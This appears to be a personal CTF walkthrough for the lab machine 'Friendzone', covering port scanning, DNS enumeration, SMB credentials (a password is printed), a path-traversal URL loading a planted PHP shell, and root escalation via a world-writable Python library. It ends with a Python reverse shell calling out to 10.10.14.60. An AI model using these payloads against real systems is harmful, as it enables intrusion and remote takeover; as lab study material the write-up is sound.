<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.123 Friendzone2</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.123 Friendzone2</h1><br/>nmap showed that 21, 22, 53, 80, 139, 443, and 445 were open.<br />ftp anonymous was not allowed<br />OpenSSH banner showed 7.6p1 which after some recon revealed that the machine was probably a Ubuntu Bionic 18.04<br /><br />dns recon went wild and after going through initially and then over agian after some hints in the web pages the following got added to the /etc/hosts file<br />10.10.10.123 friendzone.red friendzoneportal.red friendzone admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red<br /><br />While using SquidsSmbTool I found the creds<br />    admin:WORKWORKHhallelujah@#<br /><br />the creds worked on <a href="https://administrator1.friendzone.red">https://administrator1.friendzone.red</a><br />I was able to use the php “filter base64” trick to see the real code, not super helpful but neat trick<br /><br />I was able to put via smb to the /etc/Development file<br /><a href="https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../../../../etc/Development/phpshell">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=../../../../../../../../etc/Development/phpshell</a><br />execute ^^ from the webpage and Boom!! reverse shell!!!!<br /><br />While doing initial enumeration while looking throught the /opt/ directory I found a custom python script. I used pspy to determine if it was being called on a cron.<br />It is!!<br />LinEnum.sh showed that /usr/lib/python2.7/os.py is world writeable!!<br />pulled a copy over to the kali machine for easier manipulation.<br />copied over PenTestMonkeys python one liner and put it into code form just like so<br /><br />import socket,subprocess, os<br />s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />s.connect((&quot;10.10.14.60&quot;,3233))<br />os.dup2(s.fileno(),0)<br />os.dup2(s.fileno(),1)<br />os.dup2(s.fileno(),2)<br />p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])<br /><br />copied it back over, nc listener... rooted.</div></body></html>